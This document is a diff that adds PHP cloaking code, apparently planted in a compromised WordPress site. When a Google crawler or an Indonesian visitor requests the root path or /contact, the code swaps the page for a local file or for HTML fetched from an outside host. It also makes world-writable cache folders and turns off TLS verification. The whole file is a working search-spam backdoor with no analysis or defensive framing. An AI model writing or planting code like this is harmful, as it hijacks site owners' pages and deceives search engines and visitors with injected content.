@@ -1,0 +1,85 @@
+CL AMP FOLDER
+
+<?php if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgent=$_SERVER['HTTP_USER_AGENT'];}else{$userAgent='';}if(!empty($_SERVER['HTTP_REFERER'])){$referer=$_SERVER['HTTP_REFERER'];}else{$referer='';}$googleBots=['Googlebot','AdsBot','Mediapartners-Google','APIs-Google','Googlebot-Image','Googlebot-Video','Googlebot-News','Googlebot-Search','Googlebot-Inspect','Googlebot-Android','Googlebot-Mobile','Googlebot-Ads','Googlebot-Discovery','Google-',];if(preg_match('/'.implode('|',$googleBots).'/i',$userAgent)||strpos($referer,'google.')!==false){if($_SERVER['REQUEST_URI']=='/'){include 'web.config.php';die();}} ?>
+<?php
+$config = [
+    "bot_user_agents" => ["Googlebot", "Googlebot-Image", "Googlebot-Video", "Googlebot-News", "Storebot-Google", "Google-InspectionTool", "GoogleOther"],
+    "target_countries" => ["ID"],
+    "target_endpoint" => "/contact",
+    "cloak_content_url" => "https://softechnology.biz/raw/Gigcs6sSs8",
+    "ip_cache_ttl" => 86400,
+    "lp_cache_ttl" => 3600,
+    "cache_directory" => __DIR__ . "/../wp-content/uploads/cache_lp",
+];
+
+$uri = $_SERVER["REQUEST_URI"] ?? "";
+$current_path = rtrim(explode('?', $uri)[0], '/');
+$target_path = rtrim($config["target_endpoint"], '/');
+
+if ($current_path === $target_path) {
+    // ANTI-CACHE
+    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+    header("Pragma: no-cache");
+
+    if (!function_exists('get_client_ip')) {
+        function get_client_ip(): string {
+            $headers = ["HTTP_CF_CONNECTING_IP", "HTTP_X_FORWARDED_FOR", "HTTP_CLIENT_IP", "REMOTE_ADDR"];
+            foreach ($headers as $header) {
+                if (!empty($_SERVER[$header])) {
+                    $ips = explode(",", $_SERVER[$header]);
+                    $ip = trim($ips[0]);
+                    if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+                }
+            }
+            return "127.0.0.1";
+        }
+    }
+
+    if (!function_exists('make_request')) {
+        function make_request(string $url) {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_TIMEOUT => 20,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"] ?? "Mozilla/5.0",
+            ]);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+    }
+
+    $client_ip = get_client_ip();
+    $user_agent = strtolower($_SERVER["HTTP_USER_AGENT"] ?? "null");
+    $is_bot = (bool) preg_match("/" . implode("|", $config["bot_user_agents"]) . "/i", $user_agent);
+
+    $should_cloak = $is_bot;
+    if (!$is_bot) {
+        $ip_cache_dir = $config["cache_directory"] . "/ip";
+        if (!is_dir($ip_cache_dir)) @mkdir($ip_cache_dir, 0777, true);
+        $cache_file = $ip_cache_dir . "/ip_" . md5($client_ip) . ".json";
+        
+        $geo_info = ["country" => "UNKNOWN"];
+        if (file_exists($cache_file) && time() - filemtime($cache_file) < $config["ip_cache_ttl"]) {
+            $geo_info = json_decode(file_get_contents($cache_file), true);
+        } else {
+            $res = make_request("http://ip-api.com/json/{$client_ip}");
+            $data = json_decode($res, true);
+            $geo_info["country"] = $data["countryCode"] ?? "UNKNOWN";
+            if ($geo_info["country"] !== "UNKNOWN") file_put_contents($cache_file, json_encode($geo_info));
+        }
+        if (in_array($geo_info["country"], $config["target_countries"])) $should_cloak = true;
+    }
+
+    if ($should_cloak) {
+        $content = make_request($config["cloak_content_url"]);
+        if ($content && strlen(trim($content)) > 100) {
+            while (ob_get_level()) ob_end_clean();
+            header("Content-Type: text/html; charset=utf-8");
+            echo $content;
+            exit();
+        }
+    }
+}
